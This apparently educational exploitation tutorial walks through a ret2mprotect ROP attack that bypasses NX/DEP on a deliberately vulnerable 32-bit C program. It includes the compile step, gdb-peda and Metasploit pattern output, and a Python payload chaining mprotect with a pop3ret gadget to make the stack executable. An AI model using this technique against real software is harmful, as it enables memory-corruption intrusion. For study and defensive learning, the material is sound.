## ROP : pointer leaking + return-into-mprotect()

- - -

#### We are in the era of high complexity to bypass mitigation against memory corruption.

**Ret2mprotect** is an elegant way to bypass mitigation like **NX/DEP** by using ```mprotect()``` to set memory protection.

I assume that you are confortable with x86 stack-based overflow, ASM and shellcode.

Let's take a vanilla sample :

```
#include<stdio.h>
#include<stdlib.h>

int main() {
    char name[512];
    fgets(name, 1024, stdin);
    printf("Hello %s", name);
    return 0;
}
```

Compile with explicit *noexecutable stack* flag.

```
$ gcc -m32 pwnme.c -o pwnme -znoexecstack

$ file pwnme exploitme: ELF 32-bit LSB executable, Intel 80386, version 1
(SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26,
BuildID[sha1]=0x19883d935e336675dd19ceb894dc09fd15e5903c, not stripped
```

Basically, same methodology for any x86 stack-based overflow by creating a unique pattern (I use *metasploit*).

We will override ```EIP``` at ```offset 524```.

```
$ /usr/share/metasploit-framework/tools/pattern_create.rb 999 > /tmp/in

$ gdb ~/pwnme -q
gdb-peda$ r < /tmp/in
Stopped reason: SIGSEGV 0x35724134 in ?? ()

$ /usr/share/metasploit-framework/tools/pattern_offset.rb 0x35724134
[*] Exact match at offset 524
```

Our stack begin at ```0xfffdd000``` and have a size of ```0x21000```.

```
gdb-peda$ vmmap
Start      End        Perm  Name
0xfffdd000 0xffffe000 rw-p  [stack]
```

Assuming that **ASLR** is disabled.

```
gdb-peda$ p mprotect $1 = {<text variable, no debug info>} 0xf7f2d2e0 <mprotect>
Address of mprotect : 0xf7f2d2e0
```

The manual of ```mprotect()``` give us the signature of the function.

```
$ man mprotect

NAME mprotect - set protection on a region of memory
SYNOPSIS #include <sys/mman.h> int mprotect(void *addr, size_t len, int prot);
```

Thus we know which argument to push.
It should look like this : ```mprotect(0xfffdd000, 0x21000, 0x7);```

```
gdb-peda$ searchmem CC 0xfffdd000 0xffffe000
Searching for 'cc' in range: 0xfffdd000 - 0xffffe000
0xffffd2c0 --> 0xcccccccc [stack] : 0xffffd2c1 --> 0xcccccccc [stack] :
0xffffd2c2 --> 0xcccccccc [stack] : 0xffffd2c3 --> 0xcccccccc [stack] :
0xffffd2c4 --> 0xcccccccc [stack] : 0xffffd2c5 --> 0xcccccccc [stack] :
0xffffd2c6 --> 0xcccccccc [stack] : 0xffffd2c7 --> 0xcccccccc [stack] :
```

Gogo Gadget. :o)

```
gdb-peda$ ropgadget
pop3ret = 0x8048882
```

Finally.

```
python -c "
    print'\xCC' * 524         # CC is the opcode for SIGTRAP
    +'\xe0\xd2\xf2\xf7'       # address of mprotect()
    +'\x82\x88\x04\x08'       # pop3ret cleaning the stack layout
    +'\x00\xd0\xfd\xff'       # address of the stack
    +'\x00\x10\x02\x00'       # size of the stack
    +'\x07\x00\x00\x00'"      # flag read/write/execute
    +'\xc0\xd2\xff\xff'       # payload on the stack ;)
```

After calling mprotect you can notice the execution flag on the stack.

```
gdb-peda$ vmmap
Start      End        Perm  Name
0xfffdd000 0xffffe000 rwxp	[stack]
```

@tfairane greetz @barrebas
